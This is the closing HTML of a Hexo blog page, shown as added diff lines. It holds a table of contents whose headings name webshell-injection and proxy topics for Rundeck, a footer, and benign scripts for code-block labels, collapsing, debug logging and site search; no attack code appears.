添加Godzila注入</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#2-%E6%B7%BB%E5%8A%A0suo5%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-article-text">2. 添加suo5正向代理</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BC%96%E5%86%99Rundeck-%E6%8F%92%E4%BB%B6-%E6%AD%A3%E5%BC%8F%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5%E6%8F%92%E4%BB%B6"><span class="toc-article-text">编写Rundeck 插件 &amp;&amp; 正式环境注入插件</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Ending"><span class="toc-article-text">Ending</span></a></li></ol>
+		</div>
+	</div>
+	
+
+
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 BlackOwl's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack.modify</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script>
+
+<script>
+(function() {
+  var langColors = {
+    rust:       '#f0883e',
+    java:       '#4e9eda',
+    python:     '#dcdcaa',
+    javascript: '#f7df1e',
+    js:         '#f7df1e',
+    typescript: '#3178c6',
+    ts:         '#3178c6',
+    c:          '#4fc1ff',
+    cpp:        '#4fc1ff',
+    go:         '#79d4fd',
+    bash:       '#6db33f',
+    sh:         '#6db33f',
+    shell:      '#6db33f',
+    html:       '#e34c26',
+    css:        '#563d7c',
+    sql:        '#e38c00',
+    plaintext:  '#6e7681',
+  };
+  document.querySelectorAll('figure.highlight').forEach(function(fig) {
+    var lang = Array.from(fig.classList).find(function(c) { return c !== 'highlight'; });
+    var label = document.createElement('div');
+    label.textContent = lang === 'plaintext' ? 'text' : lang;
+    var color = langColors[lang] || '#79c0ff';
+    label.style.cssText = 'padding:3px 12px;font-size:11px;color:' + color + ';background:#161b22;border-bottom:1px solid #30363d;border-radius:6px 6px 0 0;text-align:right;font-family:monospace;user-select:none;-webkit-user-select:none;';
+    fig.insertBefore(label, fig.firstChild);
+  });
+})();
+</script>
+
+<script>
+// 代码块自动折叠
+(function() {
+  var THRESHOLD = 15; // 超过此行数自动折叠
+  document.querySelectorAll('figure.highlight').forEach(function(fig) {
+    var lines = fig.querySelectorAll('.gutter .line').length;
+    if (lines <= THRESHOLD) return;
+
+    fig.classList.add('code-collapsed');
+
+    var btn = document.createElement('button');
+    btn.className = 'code-toggle-btn';
+    btn.textContent = '▼ 展开代码（共 ' + lines + ' 行）';
+    fig.parentNode.insertBefore(btn, fig.nextSibling);
+
+    btn.addEventListener('click', function() {
+      var collapsed = fig.classList.toggle('code-collapsed');
+      btn.textContent = collapsed
+        ? '▼ 展开代码（共 ' + lines + ' 行）'
+        : '▲ 收起代码';
+    });
+  });
+})();
+</script>
+
+<script>
+// 诊断：输出 strong 元素的实际计算样式
+var s = document.querySelector('strong');
+if (s) {
+  var cs = window.getComputedStyle(s);
+  console.log('[bold-debug] fontFamily:', cs.fontFamily);
+  console.log('[bold-debug] textTransform:', cs.textTransform);
+  console.log('[bold-debug] fontVariant:', cs.fontVariant);
+  console.log('[bold-debug] fontVariantCaps:', cs.fontVariantCaps);
+}
+</script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
